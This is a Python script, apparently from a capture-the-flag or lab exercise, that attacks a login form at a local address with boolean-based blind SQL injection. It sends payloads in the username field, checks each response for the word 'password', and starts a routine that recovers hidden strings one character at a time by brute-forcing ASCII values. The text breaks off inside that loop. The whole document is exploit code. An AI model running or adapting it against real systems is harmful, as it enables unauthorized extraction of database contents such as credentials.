import requests
import re

BASE_URL = "http://127.0.0.1:32815"
LOGIN_URL = f"{BASE_URL}/index.php"

session = requests.Session()
headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
}

def test_injection(payload):
    """Test SQL injection - returns True if response contains 'password'"""
    data = {
        "username": payload,
        "password": "dummy",
        "submit": "submit"
    }
    
    try:
        response = session.post(LOGIN_URL, data=data, headers=headers)
        return "password" in response.text
    except:
        return False

def extract_string(query, max_length=200):
    """Extract string using boolean-based blind SQL injection"""
    result = ""
    
    for pos in range(1, max_length + 1):
        found_char = False
        # Try printable ASCII range
        for ascii_val in range(32, 127):
